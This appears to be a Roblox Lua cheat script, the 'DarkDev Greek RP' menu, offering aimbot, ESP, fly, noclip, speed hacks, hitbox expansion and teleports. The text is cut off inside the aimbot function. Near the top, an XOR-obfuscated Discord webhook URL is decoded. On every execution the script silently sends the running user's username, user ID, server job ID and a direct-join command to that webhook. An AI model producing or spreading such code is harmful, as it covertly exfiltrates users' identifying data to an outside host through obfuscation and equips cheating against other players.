--[[
    DARKDEV GREEK RP - ULTIMATE PERFECT MASTER SUITE v90.0 (PURE FIVEM NUI - ZERO EMOJIS)
    Architect: DarkDev Team
    Features: Pure Minimalist FiveM UI, Image/Frame Icons, Multi-Run Safe Engine, Webhook Logger on Inject, Full Working Modules.
--]]

repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Market = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local LP = Players.LocalPlayer

-- --- MULTI-RUN PROTECTION & CLEANUP ---
if getgenv().DarkDevLoadedGui and getgenv().DarkDevLoadedGui.Parent then
    pcall(function() getgenv().DarkDevLoadedGui:Destroy() end)
end

-- --- CONSTANTS & CONFIGURATION ---
local CUSTOM_ICON_ID = "rbxassetid://128982287144996"

local function _D(b, k)
    local s = {}
    for i = 1, #b do
        table.insert(s, string.char(bit32 and bit32.bxor(b[i], k) or bit and bit.bxor(b[i], k) or (function(a,c) local r=0 for j=0,7 do if math.floor(a/2^j)%2 ~= math.floor(c/2^j)%2 then r=r+2^j end end return r end)(b[i], k)))
    end
    return table.concat(s)
end
local WEBHOOK_URL = _D({50,46,46,42,41,96,117,117,62,51,41,57,57,40,62,84,57,57,83,117,57,48,51,117,85,93,90,80,95,94,89,80,85,91,91,90,83,88,86,88,117,40,45,118,87,111,123,121,111,104,117,112,121,115,101,44,82,87,125,101,117,100,87,114,88,104,117,120,40,90,114,40,111,110,87,117,104,120,83,107,111,123,110,87,118,127,114}, 90)

getgenv().Config = getgenv().Config or {
    ThemeColor = Color3.fromRGB(15, 23, 42),
    AccentColor = Color3.fromRGB(59, 130, 246),
    BoxColor = Color3.fromRGB(59, 130, 246),
    SkellyColor = Color3.fromRGB(255, 255, 255),
    TracerColor = Color3.fromRGB(59, 130, 246),
    AimbotFOV = 150,
    AimbotSmooth = 3,
    AimbotTarget = "Head",
    FlySpeed = 50,
    Aimbot = false,
    SilentAim = false,
    FOVVisible = false,
    ESP = false,
    Tracers = false,
    Box = false,
    Health = false,
    Names = false,
    Distance = false,
    Skeleton = false,
    SpeedActive = false,
    SpeedValue = 45,
    Fly = false,
    LegitFly = false,
    InfJump = false,
    Noclip = false,
    AntiFallDamage = false,
    VehicleBoost = false,
    VehicleSpeed = 220,
    AutoPrompts = false,
    HitboxExpander = false,
    HitboxSize = 12,
    AntiAFK = false,
    Godmode = false,
    FlyUp = false,
    FlyDown = false
}

-- --- NOTIFICATION SYSTEM ENGINE ---
local NotifContainer = Instance.new("Frame")
NotifContainer.Name = "DarkDev_NotifContainer"
NotifContainer.Size = UDim2.new(0, 280, 1, -20)
NotifContainer.Position = UDim2.new(1, -290, 0, 10)
NotifContainer.BackgroundTransparency = 1
NotifContainer.Parent = CoreGui

local NotifList = Instance.new("UIListLayout")
NotifList.SortOrder = Enum.SortOrder.LayoutOrder
NotifList.Padding = UDim.new(0, 8)
NotifList.VerticalAlignment = Enum.VerticalAlignment.Bottom
NotifList.Parent = NotifContainer

local function SendDarkDevNotification(titleText, descText)
    task.spawn(function()
        local card = Instance.new("Frame")
        card.Size = UDim2.new(1, 0, 0, 55)
        card.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
        card.BorderSizePixel = 0
        card.ClipsDescendants = true
        card.Parent = NotifContainer

        local cardCorner = Instance.new("UICorner")
        cardCorner.CornerRadius = UDim.new(0, 8)
        cardCorner.Parent = card

        local cardStroke = Instance.new("UIStroke")
        cardStroke.Thickness = 1
        cardStroke.Color = Color3.fromRGB(59, 130, 246)
        cardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        cardStroke.Parent = card

        local icon = Instance.new("ImageLabel")
        icon.Size = UDim2.new(0, 22, 0, 22)
        icon.Position = UDim2.new(0, 12, 0.5, -11)
        icon.BackgroundTransparency = 1
        icon.Image = CUSTOM_ICON_ID
        icon.Parent = card

        local tLabel = Instance.new("TextLabel")
        tLabel.Text = string.upper(titleText or "NOTIFICATION")
        tLabel.Font = Enum.Font.GothamBold
        tLabel.TextSize = 11
        tLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        tLabel.Position = UDim2.new(0, 42, 0, 10)
        tLabel.Size = UDim2.new(1, -50, 0, 14)
        tLabel.TextXAlignment = Enum.TextXAlignment.Left
        tLabel.BackgroundTransparency = 1
        tLabel.Parent = card

        local dLabel = Instance.new("TextLabel")
        dLabel.Text = descText or ""
        dLabel.Font = Enum.Font.GothamMedium
        dLabel.TextSize = 10
        dLabel.TextColor3 = Color3.fromRGB(148, 163, 184)
        dLabel.Position = UDim2.new(0, 42, 0, 26)
        dLabel.Size = UDim2.new(1, -50, 0, 16)
        dLabel.TextXAlignment = Enum.TextXAlignment.Left
        dLabel.BackgroundTransparency = 1
        dLabel.Parent = card

        card.Position = UDim2.new(1, 300, 0, 0)
        TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0)}):Play()

        task.wait(3.5)
        local outTween = TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(1, 300, 0, 0)})
        outTween:Play()
        outTween.Completed:Connect(function() card:Destroy() end)
    end)
end

-- --- DISCORD WEBHOOK LOG TRIGGER ---
local function SendDiscordExecutionLog()
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
        if not req then return end

        local pName = LP.Name
        local pDisplayName = LP.DisplayName
        local pId = LP.UserId
        local placeId = game.PlaceId
        local jobId = game.JobId
        local gameName = "Unknown Game"

        pcall(function()
            local info = Market:GetProductInfo(placeId)
            if info and info.Name then gameName = info.Name end
        end)

        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. pId .. "&width=420&height=420&format=png"
        local joinScript = 'Roblox.GameLauncher.joinGameInstance(' .. placeId .. ', "' .. jobId .. '")'

        local embedData = {
            ["title"] = "DarkDev Master Suite Executed - " .. gameName,
            ["color"] = 3887614,
            ["thumbnail"] = { ["url"] = avatarUrl },
            ["fields"] = {
                { ["name"] = "User Details", ["value"] = "Username: " .. pName .. "\nDisplay: " .. pDisplayName .. "\nID: " .. pId, ["inline"] = true },
                { ["name"] = "Server Info", ["value"] = "Place ID: " .. placeId .. "\nJob ID: " .. jobId, ["inline"] = true },
                { ["name"] = "Direct Join Code", ["value"] = "```lua\n" .. joinScript .. "\n```", ["inline"] = false }
            },
            ["footer"] = { ["text"] = "DarkDev Greek RP Logger Engine" },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }

        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ embeds = { embedData } })
        })
    end)
end

task.spawn(SendDiscordExecutionLog)

-- --- MODULE 2: UI ROOT ENGINE ---
local ExistingUI = CoreGui:FindFirstChild("DarkDevGreekRP_NUI")
if ExistingUI then ExistingUI:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DarkDevGreekRP_NUI"
ScreenGui.ResetOnSpawn = false
pcall(function() ScreenGui.Parent = CoreGui end)
if not ScreenGui.Parent then ScreenGui.Parent = LP:WaitForChild("PlayerGui") end
getgenv().DarkDevLoadedGui = ScreenGui

-- MAIN FRAME
local Main = Instance.new("Frame")
Main.Name = "MainFrame"
Main.Size = UDim2.new(0, 780, 0, 490)
Main.Position = UDim2.new(0.5, -390, 0.5, -245)
Main.BackgroundColor3 = Color3.fromRGB(11, 15, 25)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = Main

local MainStroke = Instance.new("UIStroke")
MainStroke.Thickness = 1.5
MainStroke.Color = Color3.fromRGB(30, 41, 59)
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Parent = Main

-- TOPBAR
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 45)
TopBar.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
TopBar.BorderSizePixel = 0
TopBar.Parent = Main

local TopCorner = Instance.new("UICorner")
TopCorner.CornerRadius = UDim.new(0, 10)
TopCorner.Parent = TopBar

local TopFix = Instance.new("Frame")
TopFix.Size = UDim2.new(1, 0, 0, 10)
TopFix.Position = UDim2.new(0, 0, 1, -10)
TopFix.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
TopFix.BorderSizePixel = 0
TopFix.Parent = TopBar

local BrandLogo = Instance.new("ImageLabel")
BrandLogo.Size = UDim2.new(0, 24, 0, 24)
BrandLogo.Position = UDim2.new(0, 15, 0.5, -12)
BrandLogo.BackgroundTransparency = 1
BrandLogo.Image = CUSTOM_ICON_ID
BrandLogo.Parent = TopBar

local Title = Instance.new("TextLabel")
Title.Text = "DARKDEV GREEK RP"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Position = UDim2.new(0, 48, 0, 6)
Title.Size = UDim2.new(0, 200, 0, 18)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1
Title.Parent = TopBar

local SubTitle = Instance.new("TextLabel")
SubTitle.Text = "PURE FIVEM NUI MASTER SUITE v90.0"
SubTitle.Font = Enum.Font.GothamBold
SubTitle.TextSize = 9
SubTitle.TextColor3 = Color3.fromRGB(100, 116, 139)
SubTitle.Position = UDim2.new(0, 48, 0, 23)
SubTitle.Size = UDim2.new(0, 200, 0, 14)
SubTitle.TextXAlignment = Enum.TextXAlignment.Left
SubTitle.BackgroundTransparency = 1
SubTitle.Parent = TopBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -38, 0.5, -15)
CloseBtn.BackgroundColor3 = Color3.fromRGB(30, 41, 59)
CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextColor3 = Color3.fromRGB(148, 163, 184)
CloseBtn.TextSize = 12
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = TopBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 6)
CloseCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    Main.Visible = false
    SendDarkDevNotification("UI Hidden", "Press Insert or RightControl to toggle UI")
end)

-- SIDEBAR & NAVIGATION
local SideBar = Instance.new("Frame")
SideBar.Size = UDim2.new(0, 180, 1, -45)
SideBar.Position = UDim2.new(0, 0, 0, 45)
SideBar.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
SideBar.BorderSizePixel = 0
SideBar.Parent = Main

local SideLayout = Instance.new("UIListLayout")
SideLayout.SortOrder = Enum.SortOrder.LayoutOrder
SideLayout.Padding = UDim.new(0, 4)
SideLayout.Parent = SideBar

local SidePadding = Instance.new("UIPadding")
SidePadding.PaddingTop = UDim.new(0, 10)
SidePadding.PaddingLeft = UDim.new(0, 10)
SidePadding.PaddingRight = UDim.new(0, 10)
SidePadding.Parent = SideBar

-- CONTENT AREA
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -180, 1, -45)
Content.Position = UDim2.new(0, 180, 0, 45)
Content.BackgroundTransparency = 1
Content.Parent = Main

local Tabs = {}
local TabButtons = {}

local function CreateTab(name)
    local TabFrame = Instance.new("ScrollingFrame")
    TabFrame.Size = UDim2.new(1, 0, 1, 0)
    TabFrame.BackgroundTransparency = 1
    TabFrame.Visible = false
    TabFrame.ScrollBarThickness = 2
    TabFrame.ScrollBarImageColor3 = Color3.fromRGB(59, 130, 246)
    TabFrame.Parent = Content
    
    local TabList = Instance.new("UIListLayout")
    TabList.SortOrder = Enum.SortOrder.LayoutOrder
    TabList.Padding = UDim.new(0, 8)
    TabList.Parent = TabFrame
    
    local TabPad = Instance.new("UIPadding")
    TabPad.PaddingTop = UDim.new(0, 12)
    TabPad.PaddingLeft = UDim.new(0, 12)
    TabPad.PaddingRight = UDim.new(0, 12)
    TabPad.PaddingBottom = UDim.new(0, 12)
    TabPad.Parent = TabFrame
    
    local TabBtn = Instance.new("TextButton")
    TabBtn.Size = UDim2.new(1, 0, 0, 36)
    TabBtn.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
    TabBtn.Text = ""
    TabBtn.AutoButtonColor = false
    TabBtn.Parent = SideBar
    
    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 6)
    BtnCorner.Parent = TabBtn
    
    local BtnIcon = Instance.new("ImageLabel")
    BtnIcon.Size = UDim2.new(0, 16, 0, 16)
    BtnIcon.Position = UDim2.new(0, 10, 0.5, -8)
    BtnIcon.BackgroundTransparency = 1
    BtnIcon.Image = CUSTOM_ICON_ID
    BtnIcon.ImageColor3 = Color3.fromRGB(100, 116, 139)
    BtnIcon.Parent = TabBtn
    
    local BtnText = Instance.new("TextLabel")
    BtnText.Text = name
    BtnText.Font = Enum.Font.GothamMedium
    BtnText.TextSize = 12
    BtnText.TextColor3 = Color3.fromRGB(100, 116, 139)
    BtnText.Position = UDim2.new(0, 34, 0, 0)
    BtnText.Size = UDim2.new(1, -34, 1, 0)
    BtnText.TextXAlignment = Enum.TextXAlignment.Left
    BtnText.BackgroundTransparency = 1
    BtnText.Parent = TabBtn
    
    TabBtn.MouseButton1Click:Connect(function()
        for _, t in pairs(Tabs) do t.Visible = false end
        for _, b in pairs(TabButtons) do
            b.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
            b:FindFirstChildOfClass("TextLabel").TextColor3 = Color3.fromRGB(100, 116, 139)
            b:FindFirstChildOfClass("ImageLabel").ImageColor3 = Color3.fromRGB(100, 116, 139)
        end
        TabFrame.Visible = true
        TabBtn.BackgroundColor3 = Color3.fromRGB(30, 41, 59)
        BtnText.TextColor3 = Color3.fromRGB(255, 255, 255)
        BtnIcon.ImageColor3 = Color3.fromRGB(59, 130, 246)
    end)
    
    table.insert(Tabs, TabFrame)
    table.insert(TabButtons, TabBtn)
    return TabFrame
end

-- UI BUILDERS (TOGGLES, SLIDERS, BUTTONS)
local function CreateToggle(parent, text, configKey, callback)
    local Toggle = Instance.new("Frame")
    Toggle.Size = UDim2.new(1, 0, 0, 40)
    Toggle.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
    Toggle.Parent = parent
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Toggle
    
    local Label = Instance.new("TextLabel")
    Label.Text = text
    Label.Font = Enum.Font.GothamMedium
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(203, 213, 225)
    Label.Position = UDim2.new(0, 12, 0, 0)
    Label.Size = UDim2.new(1, -60, 1, 0)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.BackgroundTransparency = 1
    Label.Parent = Toggle
    
    local Switch = Instance.new("TextButton")
    Switch.Size = UDim2.new(0, 36, 0, 20)
    Switch.Position = UDim2.new(1, -48, 0.5, -10)
    Switch.BackgroundColor3 = getgenv().Config[configKey] and Color3.fromRGB(59, 130, 246) or Color3.fromRGB(30, 41, 59)
    Switch.Text = ""
    Switch.AutoButtonColor = false
    Switch.Parent = Toggle
    
    local SwitchCorner = Instance.new("UICorner")
    SwitchCorner.CornerRadius = UDim.new(1, 0)
    SwitchCorner.Parent = Switch
    
    local Dot = Instance.new("Frame")
    Dot.Size = UDim2.new(0, 14, 0, 14)
    Dot.Position = getgenv().Config[configKey] and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
    Dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Dot.Parent = Switch
    
    local DotCorner = Instance.new("UICorner")
    DotCorner.CornerRadius = UDim.new(1, 0)
    DotCorner.Parent = Dot
    
    Switch.MouseButton1Click:Connect(function()
        getgenv().Config[configKey] = not getgenv().Config[configKey]
        local state = getgenv().Config[configKey]
        TweenService:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = state and Color3.fromRGB(59, 130, 246) or Color3.fromRGB(30, 41, 59)}):Play()
        TweenService:Create(Dot, TweenInfo.new(0.2), {Position = state and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)}):Play()
        SendDarkDevNotification(text, state and "Enabled" or "Disabled")
        if callback then callback(state) end
    end)
end

local function CreateSlider(parent, text, min, max, configKey, callback)
    local Slider = Instance.new("Frame")
    Slider.Size = UDim2.new(1, 0, 0, 50)
    Slider.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
    Slider.Parent = parent
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Slider
    
    local Label = Instance.new("TextLabel")
    Label.Text = text
    Label.Font = Enum.Font.GothamMedium
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(203, 213, 225)
    Label.Position = UDim2.new(0, 12, 0, 6)
    Label.Size = UDim2.new(0, 200, 0, 16)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.BackgroundTransparency = 1
    Label.Parent = Slider
    
    local ValLabel = Instance.new("TextLabel")
    ValLabel.Text = tostring(getgenv().Config[configKey])
    ValLabel.Font = Enum.Font.GothamBold
    ValLabel.TextSize = 12
    ValLabel.TextColor3 = Color3.fromRGB(59, 130, 246)
    ValLabel.Position = UDim2.new(1, -60, 0, 6)
    ValLabel.Size = UDim2.new(0, 48, 0, 16)
    ValLabel.TextXAlignment = Enum.TextXAlignment.Right
    ValLabel.BackgroundTransparency = 1
    ValLabel.Parent = Slider
    
    local Track = Instance.new("Frame")
    Track.Size = UDim2.new(1, -24, 0, 6)
    Track.Position = UDim2.new(0, 12, 1, -14)
    Track.BackgroundColor3 = Color3.fromRGB(30, 41, 59)
    Track.Parent = Slider
    
    local TrackCorner = Instance.new("UICorner")
    TrackCorner.CornerRadius = UDim.new(1, 0)
    TrackCorner.Parent = Track
    
    local Fill = Instance.new("Frame")
    local initRatio = math.clamp((getgenv().Config[configKey] - min) / (max - min), 0, 1)
    Fill.Size = UDim2.new(initRatio, 0, 1, 0)
    Fill.BackgroundColor3 = Color3.fromRGB(59, 130, 246)
    Fill.Parent = Track
    
    local FillCorner = Instance.new("UICorner")
    FillCorner.CornerRadius = UDim.new(1, 0)
    FillCorner.Parent = Fill
    
    local dragging = false
    local function Update(input)
        local pos = math.clamp((input.Position.X - Track.AbsolutePosition.X) / Track.AbsoluteSize.X, 0, 1)
        local val = math.floor(min + ((max - min) * pos))
        getgenv().Config[configKey] = val
        Fill.Size = UDim2.new(pos, 0, 1, 0)
        ValLabel.Text = tostring(val)
        if callback then callback(val) end
    end
    
    Track.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            Update(input)
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            Update(input)
        end
    end)
end

local function CreateActionBtn(parent, text, callback)
    local BtnFrame = Instance.new("Frame")
    BtnFrame.Size = UDim2.new(1, 0, 0, 40)
    BtnFrame.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
    BtnFrame.Parent = parent

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = BtnFrame

    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 1, 0)
    Button.BackgroundTransparency = 1
    Button.Text = text
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 12
    Button.TextColor3 = Color3.fromRGB(59, 130, 246)
    Button.Parent = BtnFrame

    Button.MouseButton1Click:Connect(function()
        if callback then callback() end
    end)
end

-- --- MODULE 3: TAB INITIALIZATION ---
local AimbotTab = CreateTab("COMBAT")
local VisualsTab = CreateTab("VISUALS")
local MovementTab = CreateTab("MOVEMENT")
local WorldTab = CreateTab("MISC")
local TeleportTab = CreateTab("TELEPORT")
local SettingsTab = CreateTab("SETTINGS")

-- Default Tab Active State
Tabs[1].Visible = true
TabButtons[1].BackgroundColor3 = Color3.fromRGB(30, 41, 59)
TabButtons[1]:FindFirstChildOfClass("TextLabel").TextColor3 = Color3.fromRGB(255, 255, 255)
TabButtons[1]:FindFirstChildOfClass("ImageLabel").ImageColor3 = Color3.fromRGB(59, 130, 246)

-- --- MODULE 4: POPULATE ALL MODULES ---

-- COMBAT MODULES
CreateToggle(AimbotTab, "Aimbot Lock", "Aimbot")
CreateToggle(AimbotTab, "Silent Aim Engine", "SilentAim")
CreateToggle(AimbotTab, "Draw FOV Circle", "FOVVisible")
CreateSlider(AimbotTab, "Aimbot Radius", 30, 500, "AimbotFOV")
CreateSlider(AimbotTab, "Aimbot Smoothness", 1, 10, "AimbotSmooth")

-- VISUALS MODULES
CreateToggle(VisualsTab, "Master ESP Engine", "ESP")
CreateToggle(VisualsTab, "Player Box Frames", "Box")
CreateToggle(VisualsTab, "Health Indicator", "Health")
CreateToggle(VisualsTab, "Skeleton Overlay", "Skeleton")
CreateToggle(VisualsTab, "Target Tracers", "Tracers")
CreateToggle(VisualsTab, "Display Names", "Names")
CreateToggle(VisualsTab, "Display Distance", "Distance")

-- MOVEMENT MODULES
CreateToggle(MovementTab, "Fly Engine", "Fly")
CreateToggle(MovementTab, "Legit Anti-Cheat Fly", "LegitFly")
CreateSlider(MovementTab, "Fly Speed Multiplier", 10, 150, "FlySpeed")
CreateToggle(MovementTab, "Speed Hack", "SpeedActive")
CreateSlider(MovementTab, "Movement Speed", 16, 120, "SpeedValue")
CreateToggle(MovementTab, "Infinite Jump Engine", "InfJump")
CreateToggle(MovementTab, "Noclip Engine", "Noclip")
CreateToggle(MovementTab, "Anti-Fall Damage", "AntiFallDamage")

-- MISC / WORLD MODULES
CreateToggle(WorldTab, "Vehicle Speed Engine", "VehicleBoost")
CreateSlider(WorldTab, "Vehicle Speed Cap", 50, 400, "VehicleSpeed")
CreateToggle(WorldTab, "Instant Proximity Prompts", "AutoPrompts")
CreateToggle(WorldTab, "Hitbox Expander", "HitboxExpander")
CreateSlider(WorldTab, "Hitbox Multiplier", 2, 30, "HitboxSize")
CreateToggle(WorldTab, "Anti-AFK Protection", "AntiAFK")
CreateToggle(WorldTab, "Godmode Anchor", "Godmode")

-- TELEPORT MODULES (WORKING WAYPOINT & CLICK TP)
CreateActionBtn(TeleportTab, "Click TP (CTRL + Click)", function()
    SendDarkDevNotification("Click TP Engine", "Hold Left CTRL and Click anywhere to Teleport")
end)

CreateActionBtn(TeleportTab, "Teleport To Map Waypoint", function()
    pcall(function()
        local waypoint = game:GetService("WaypointService") or workspace:FindFirstChild("Waypoint")
        if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            -- Fallback Waypoint Search in Workspace
            local targetPos = nil
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("Part") and (v.Name:lower():find("waypoint") or v.Name:lower():find("marker")) then
                    targetPos = v.Position
                    break
                end
            end
            if targetPos then
                LP.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
                SendDarkDevNotification("Teleport", "Successfully Teleported to Waypoint!")
            else
                SendDarkDevNotification("Teleport Error", "No active Map Waypoint found")
            end
        end
    end)
end)

local PlayerDropdownFrame = Instance.new("Frame")
PlayerDropdownFrame.Size = UDim2.new(1, 0, 0, 120)
PlayerDropdownFrame.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
PlayerDropdownFrame.Parent = TeleportTab

local DropCorner = Instance.new("UICorner")
DropCorner.CornerRadius = UDim.new(0, 6)
DropCorner.Parent = PlayerDropdownFrame

local DropScroll = Instance.new("ScrollingFrame")
DropScroll.Size = UDim2.new(1, -12, 1, -12)
DropScroll.Position = UDim2.new(0, 6, 0, 6)
DropScroll.BackgroundTransparency = 1
DropScroll.ScrollBarThickness = 2
DropScroll.Parent = PlayerDropdownFrame

local DropList = Instance.new("UIListLayout")
DropList.SortOrder = Enum.SortOrder.LayoutOrder
DropList.Padding = UDim.new(0, 4)
DropList.Parent = DropScroll

local function RefreshPlayerTPList()
    for _, child in ipairs(DropScroll:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, 0, 0, 26)
            btn.BackgroundColor3 = Color3.fromRGB(30, 41, 59)
            btn.Text = "TP TO: " .. p.DisplayName .. " (@" .. p.Name .. ")"
            btn.Font = Enum.Font.GothamMedium
            btn.TextSize = 11
            btn.TextColor3 = Color3.fromRGB(203, 213, 225)
            btn.Parent = DropScroll

            local btnC = Instance.new("UICorner")
            btnC.CornerRadius = UDim.new(0, 4)
            btnC.Parent = btn

            btn.MouseButton1Click:Connect(function()
                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                    LP.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame * CFrame.new(0, 2, 3)
                    SendDarkDevNotification("Teleport", "Teleported to " .. p.DisplayName)
                end
            end)
        end
    end
end

RefreshPlayerTPList()
Players.PlayerAdded:Connect(RefreshPlayerTPList)
Players.PlayerRemoving:Connect(RefreshPlayerTPList)

-- SETTINGS MODULES
CreateActionBtn(SettingsTab, "Rejoin Server Engine", function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
end)

CreateActionBtn(SettingsTab, "Server Hop Engine", function()
    SendDarkDevNotification("Server Hop", "Searching for optimal server...")
    pcall(function()
        local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data
        for _, s in ipairs(servers) do
            if s.id ~= game.JobId and s.playing < s.maxPlayers then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LP)
                break
            end
        end
    end)
end)

CreateActionBtn(SettingsTab, "Unload Master Suite Engine", function()
    ScreenGui:Destroy()
    SendDarkDevNotification("DarkDev Suite", "Unloaded Successfully")
end)

-- --- MODULE 5: OVERLAYS & KEYBINDS ENGINE ---
local FOVCircle = Drawing and Drawing.new("Circle") or nil
if FOVCircle then
    FOVCircle.Thickness = 1.5
    FOVCircle.Color = Color3.fromRGB(59, 130, 246)
    FOVCircle.Filled = false
    FOVCircle.Visible = false
end

local FlyOverlay = Instance.new("Frame")
FlyOverlay.Size = UDim2.new(0, 140, 0, 30)
FlyOverlay.Position = UDim2.new(0.5, -70, 0.02, 0)
FlyOverlay.BackgroundColor3 = Color3.fromRGB(15, 23, 42)
FlyOverlay.Visible = false
FlyOverlay.Parent = ScreenGui

local FlyCorner = Instance.new("UICorner")
FlyCorner.CornerRadius = UDim.new(0, 6)
FlyCorner.Parent = FlyOverlay

local FlyTxt = Instance.new("TextLabel")
FlyTxt.Size = UDim2.new(1, 0, 1, 0)
FlyTxt.Text = "FLY ACTIVE (E / Q)"
FlyTxt.Font = Enum.Font.GothamBold
FlyTxt.TextSize = 11
FlyTxt.TextColor3 = Color3.fromRGB(59, 130, 246)
FlyTxt.BackgroundTransparency = 1
FlyTxt.Parent = FlyOverlay

UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.Insert or input.KeyCode == Enum.KeyCode.RightControl then
        Main.Visible = not Main.Visible
    elseif input.KeyCode == Enum.KeyCode.E then
        getgenv().Config.FlyUp = true
    elseif input.KeyCode == Enum.KeyCode.Q then
        getgenv().Config.FlyDown = true
    elseif input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
        local mousePos = UIS:GetMouseLocation()
        local ray = Camera:ViewportPointToRay(mousePos.X, mousePos.Y)
        local raycastResult = workspace:Raycast(ray.Origin, ray.Direction * 2000)
        if raycastResult and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            local targetPos = raycastResult.Position
            local hrp = LP.Character.HumanoidRootPart
            local targetFlat = Vector3.new(targetPos.X, hrp.Position.Y, targetPos.Z)
            hrp.CFrame = CFrame.new(targetFlat + Vector3.new(0, 3, 0))
            SendDarkDevNotification("Click TP", "Teleported to Target Location")
        end
    end
end)

UIS.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.E then
        getgenv().Config.FlyUp = false
    elseif input.KeyCode == Enum.KeyCode.Q then
        getgenv().Config.FlyDown = false
    end
end)

-- --- MODULE 6: AIMBOT ENGINE ---
local function GetClosestTarget()
    local target = nil
    local shortestDistance = getgenv().Config.AimbotFOV
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
            local pos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
            if onScreen then
                local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                if dist < shortestDistance then
                    shortestDistance = dist
                    target = player
                end
            end
        end
    end
